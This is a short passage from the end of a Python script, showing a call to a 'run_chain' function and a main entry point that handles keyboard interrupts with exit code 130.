                     % (need, budget))
    return run_chain(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\ninterrupted")
        sys.exit(130)
